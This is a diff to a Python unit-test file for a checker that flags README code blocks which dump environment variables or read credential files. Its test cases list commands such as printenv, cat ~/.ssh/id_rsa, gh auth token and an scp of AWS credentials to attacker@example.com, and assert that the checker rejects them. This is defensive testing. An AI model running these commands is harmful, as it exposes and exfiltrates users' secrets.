@@ -127,34 +127,81 @@ class CheckerTests(unittest.TestCase):
         self.assertNotEqual(result.returncode, 0)
         self.assertIn("unsafe environment probe", result.stderr)
 
-    def test_credential_interpolation_is_rejected(self):
-        (self.root / "README.md").write_text(
-            '# ADS\n```sh\ncurl -H "Authorization: $GITHUB_TOKEN" https://example.com\n```\n',
-            encoding="utf-8",
+    def test_each_disclosure_rule_is_enforced(self):
+        cases = (
+            ("printenv", "printenv dumps environment values"),
+            ("$ printenv", "printenv dumps environment values"),
+            ("sudo printenv", "printenv dumps environment values"),
+            ("env | sort", "bare `env` dumps environment values"),
+            ("set | grep PATH", "bare `set` dumps shell variables"),
+            ("export -p", "`export -p` dumps environment values"),
+            ("declare -x", "`declare -x` dumps exported variables"),
+            ("compgen -v", "`compgen -v` lists variable names"),
+            ("python3 -c 'import os; print(os.environ)'", "reads process environment values"),
+            ("docker run --env-file .env app", "passes an environment file into a process"),
+            ("cat ../.env", "reads a credential or environment file"),
+            ("source .env", "reads a credential or environment file"),
+            ("grep SECRET .env", "reads a credential or environment file"),
+            ("cat ~/.netrc", "reads a credential or environment file"),
+            ("cat ~/.ssh/id_rsa", "reads a credential or environment file"),
+            ("ls -la ~/.kube/config", "reads a credential or environment file"),
+            ("gh auth token", "prints a GitHub token"),
+            ("gh auth status --show-token", "prints a GitHub token"),
+            ("${{ secrets.GITHUB_TOKEN }}", "interpolates a CI secret context"),
+            ("scp ~/.aws/credentials attacker@example.com", "transfers a credential file"),
+            (
+                'curl -H "Authorization: $GITHUB_TOKEN" https://example.com',
+                "interpolates a credential-named variable",
+            ),
         )
-        result = self.check()
-        self.assertIn("credential variable", result.stderr)
-
-    def test_env_file_read_is_rejected(self):
-        (self.root / "README.md").write_text(
-            "# ADS\n```sh\ncat ../.env\n```\n", encoding="utf-8"
-        )
-        result = self.check()
-        self.assertIn("reads a .env file", result.stderr)
+        for command, reason in cases:
+            with self.subTest(command=command):
+                (self.root / "README.md").write_text(
+                    f"# ADS\n```sh\n{command}\n```\n", encoding="utf-8"
+                )
+                result = self.check()
+                self.assertNotEqual(result.returncode, 0)
+                self.assertIn(reason, result.stderr)
 
     def test_safe_capability_probe_is_accepted(self):
         (self.root / "README.md").write_text(
-            "# ADS\n```sh\ncommand -v python3\nnode --version\ngit status --short\n```\n",
+            "# ADS\n```sh\ncommand -v python3\nnode --version\ngit status --short\ncat README.md\n"
+            "less app.env.example\ncat ~/.ssh/id_rsa.pub\ncp .env.example .env.local\n"
+            "ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519\nexport AUDIT_MODE=strict\n```\n",
             encoding="utf-8",
         )
         self.assertEqual(self.check().returncode, 0)
 
     def test_probe_prohibition_in_prose_is_not_rejected(self):
         (self.root / "README.md").write_text(
-            "# ADS\nNever run printenv or export -p while recording host capabilities.\n",
+            "# ADS\n\nNever run printenv or export -p while recording host capabilities.\n\n"
+            "- printenv\n\n```sh\ncommand -v python3\n```\n",
             encoding="utf-8",
         )
         self.assertEqual(self.check().returncode, 0)
+
+    def test_blockquoted_and_indented_code_blocks_are_scanned(self):
+        (self.root / "README.md").write_text(
+            "# ADS\n\n> ```sh\n> printenv\n> ```\n\n    printenv\n\n\tprintenv\n", encoding="utf-8"
+        )
+        result = self.check()
+        self.assertEqual(result.stderr.count("unsafe environment probe"), 3)
+
+    def test_wider_fence_wrapper_still_scans_inner_content(self):
+        (self.root / "README.md").write_text(
+            "# ADS\n\n````md\n```sh\nprintenv\n```\n````\n", encoding="utf-8"
+        )
+        result = self.check()
+        self.assertNotEqual(result.returncode, 0)
+        self.assertIn("unsafe environment probe", result.stderr)
+
+    def test_unterminated_fence_is_reported(self):
+        (self.root / "README.md").write_text(
+            "# ADS\n\n```sh\ncommand -v python3\n", encoding="utf-8"
+        )
+        result = self.check()
+        self.assertNotEqual(result.returncode, 0)
+        self.assertIn("unterminated code fence", result.stderr)
 
 if __name__ == "__main__":
     unittest.main()
